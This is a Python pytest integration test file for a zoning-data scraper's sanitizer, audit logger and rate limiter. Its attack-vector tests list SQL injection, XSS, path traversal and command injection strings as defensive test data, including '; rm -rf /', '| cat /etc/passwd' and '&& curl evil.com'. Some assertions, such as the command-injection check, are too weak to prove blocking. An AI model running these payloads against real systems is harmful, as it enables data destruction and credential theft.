"""
ZoneWise Lobster - Integration Tests

End-to-end tests validating component interactions and performance benchmarks.

Run with: pytest tests/test_integration.py -v -m integration
"""

import pytest
import time
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch
from typing import Dict, Any, List

pytestmark = pytest.mark.integration


class TestInputToAuditFlow:
    """Integration tests for InputSanitizer → AuditLogger flow."""
    
    @pytest.fixture
    def tracked_supabase(self) -> MagicMock:
        """Create mock Supabase with call tracking."""
        mock = MagicMock()
        mock.inserted_records: List[Dict] = []
        
        def track_insert(record: Dict) -> MagicMock:
            mock.inserted_records.append(record)
            return MagicMock(execute=lambda: {"data": [record]})
        
        mock.table.return_value.insert = track_insert
        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
        return mock
    
    def test_invalid_fips_logs_violation(self, tracked_supabase: MagicMock) -> None:
        """Test invalid FIPS triggers security violation audit."""
        from scripts.security_utils import InputSanitizer, AuditLogger
        
        audit = AuditLogger(tracked_supabase, "wf_test")
        
        malicious = "12009'; DROP TABLE--"
        result = InputSanitizer.sanitize_fips(malicious)
        
        assert result is None
        
        audit.log_security_violation(
            violation_type="invalid_fips",
            details={"input": malicious[:20], "blocked": True}
        )
        
        assert len(tracked_supabase.inserted_records) == 1
        assert tracked_supabase.inserted_records[0]["status"] == "blocked"
    
    def test_xss_sanitized_from_county_name(self, tracked_supabase: MagicMock) -> None:
        """Test XSS payloads are stripped from county names."""
        from scripts.security_utils import InputSanitizer
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        
        for payload in xss_payloads:
            result = InputSanitizer.sanitize_county_name(payload)
            if result:
                assert "<script>" not in result
                assert "onerror" not in result


class TestRateLimiterIntegration:
    """Integration tests for rate limiter with audit logging."""
    
    @pytest.fixture
    def mock_supabase(self) -> MagicMock:
        """Create mock Supabase."""
        mock = MagicMock()
        mock.table.return_value.insert.return_value.execute.return_value = {"data": []}
        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
        return mock
    
    def test_burst_limit_triggers_audit(self, mock_supabase: MagicMock) -> None:
        """Test exceeding burst limit logs to audit trail."""
        from scripts.global_rate_limiter import GlobalRateLimiter
        from scripts.security_utils import AuditLogger
        
        audit = AuditLogger(mock_supabase, "wf_rate_test")
        limiter = GlobalRateLimiter(mock_supabase, audit)
        
        # Exhaust municode.com burst limit (10)
        for _ in range(10):
            limiter.acquire("https://municode.com/test", "wf_test")
        
        # 11th should fail
        allowed, reason = limiter.acquire("https://municode.com/test", "wf_test")
        
        assert allowed is False
        assert "Burst limit" in reason
    
    def test_domains_rate_limited_independently(self, mock_supabase: MagicMock) -> None:
        """Test each domain has independent rate limits."""
        from scripts.global_rate_limiter import GlobalRateLimiter
        
        limiter = GlobalRateLimiter(mock_supabase)
        
        # Exhaust municode.com
        for _ in range(10):
            limiter.acquire("https://municode.com/test", "wf_test")
        
        blocked, _ = limiter.acquire("https://municode.com/test", "wf_test")
        assert blocked is False
        
        # supabase.co should still work
        allowed, _ = limiter.acquire("https://supabase.co/test", "wf_test")
        assert allowed is True


class TestFullWorkflowSimulation:
    """End-to-end workflow simulation tests."""
    
    @pytest.fixture
    def mock_supabase(self) -> MagicMock:
        """Create comprehensive mock."""
        mock = MagicMock()
        mock.audit_trail: List[Dict] = []
        
        def capture_insert(record: Dict) -> MagicMock:
            mock.audit_trail.append(record)
            return MagicMock(execute=lambda: {"data": [record]})
        
        mock.table.return_value.insert = capture_insert
        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
        return mock
    
    def test_complete_scrape_workflow_audit_trail(self, mock_supabase: MagicMock) -> None:
        """Test complete workflow creates proper audit trail."""
        from scripts.security_utils import InputSanitizer, AuditLogger, AuditEventType
        
        audit = AuditLogger(mock_supabase, "wf_complete_test")
        
        # 1. Workflow start
        audit.log(
            event_type=AuditEventType.WORKFLOW_START,
            action="scrape_county",
            target="12009:Brevard",
            status="started"
        )
        
        # 2. Input validation
        fips = InputSanitizer.sanitize_fips("12009")
        name = InputSanitizer.sanitize_county_name("Brevard")
        assert fips and name
        
        # 3. Scrape start
        audit.log(
            event_type=AuditEventType.SCRAPE_START,
            action="fetch_municode",
            target="https://municode.com/fl/brevard",
            status="started"
        )
        
        # 4. Scrape success
        audit.log(
            event_type=AuditEventType.SCRAPE_SUCCESS,
            action="fetch_municode",
            target="https://municode.com/fl/brevard",
            status="success",
            details={"districts": 15, "quality": 85}
        )
        
        # 5. Workflow end
        audit.log(
            event_type=AuditEventType.WORKFLOW_END,
            action="scrape_county",
            target="12009:Brevard",
            status="completed"
        )
        
        # Verify complete audit trail
        assert len(mock_supabase.audit_trail) == 4
        assert mock_supabase.audit_trail[0]["event_type"] == "workflow_start"
        assert mock_supabase.audit_trail[-1]["event_type"] == "workflow_end"
        
        # Verify checksums
        checksums = [r["checksum"] for r in mock_supabase.audit_trail]
        assert len(set(checksums)) == 4  # All unique


class TestPerformanceBenchmarks:
    """Performance benchmarks for critical paths."""
    
    def test_input_sanitizer_throughput(self) -> None:
        """Benchmark InputSanitizer - must handle 10K ops/sec."""
        from scripts.security_utils import InputSanitizer
        
        iterations = 10000
        
        start = time.perf_counter()
        for _ in range(iterations):
            InputSanitizer.sanitize_fips("12009")
            InputSanitizer.sanitize_county_name("Brevard")
            InputSanitizer.sanitize_url("https://municode.com/fl/brevard")
        elapsed = time.perf_counter() - start
        
        ops_per_sec = (iterations * 3) / elapsed
        assert ops_per_sec > 10000, f"Only {ops_per_sec:.0f} ops/sec"
    
    def test_rate_limiter_throughput(self) -> None:
        """Benchmark RateLimiter - must handle 1K acquires/sec."""
        from scripts.global_rate_limiter import GlobalRateLimiter
        
        mock = MagicMock()
        mock.table.return_value.upsert.return_value.execute.return_value = {}
        
        limiter = GlobalRateLimiter(mock)
        iterations = 1000
        
        start = time.perf_counter()
        for i in range(iterations):
            limiter.acquire(f"https://domain{i % 100}.com/test", "wf_bench")
        elapsed = time.perf_counter() - start
        
        ops_per_sec = iterations / elapsed
        assert ops_per_sec > 1000, f"Only {ops_per_sec:.0f} ops/sec"
    
    def test_checksum_generation_performance(self) -> None:
        """Benchmark checksum generation."""
        import hashlib
        
        iterations = 10000
        test_content = "evt_123|workflow_start|wf_test|scrape|success"
        
        start = time.perf_counter()
        for _ in range(iterations):
            hashlib.sha256(test_content.encode()).hexdigest()[:16]
        elapsed = time.perf_counter() - start
        
        ops_per_sec = iterations / elapsed
        assert ops_per_sec > 50000, f"Only {ops_per_sec:.0f} ops/sec"


class TestSecurityAttackVectors:
    """Tests for known attack vectors."""
    
    def test_sql_injection_vectors(self) -> None:
        """Test SQL injection attack vectors are blocked."""
        from scripts.security_utils import InputSanitizer
        
        sqli_vectors = [
            "'; DROP TABLE users--",
            "1' OR '1'='1",
            "1; DELETE FROM audit_logs",
            "UNION SELECT * FROM credentials",
            "1' AND SLEEP(5)--",
            "admin'--",
        ]
        
        for vector in sqli_vectors:
            fips_result = InputSanitizer.sanitize_fips(vector)
            assert fips_result is None, f"FIPS accepted SQLi: {vector}"
    
    def test_path_traversal_vectors(self) -> None:
        """Test path traversal attack vectors are blocked."""
        from scripts.security_utils import InputSanitizer
        
        traversal_vectors = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
        ]
        
        for vector in traversal_vectors:
            url_result = InputSanitizer.sanitize_url(f"https://municode.com/{vector}")
            name_result = InputSanitizer.sanitize_county_name(vector)
            # Should either reject or sanitize
            if name_result:
                assert ".." not in name_result
    
    def test_command_injection_vectors(self) -> None:
        """Test command injection vectors are blocked."""
        from scripts.security_utils import InputSanitizer
        
        cmd_vectors = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com",
        ]
        
        for vector in cmd_vectors:
            result = InputSanitizer.sanitize_county_name(vector)
            if result:
                assert ";" not in result or "|" not in result


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "integration"])
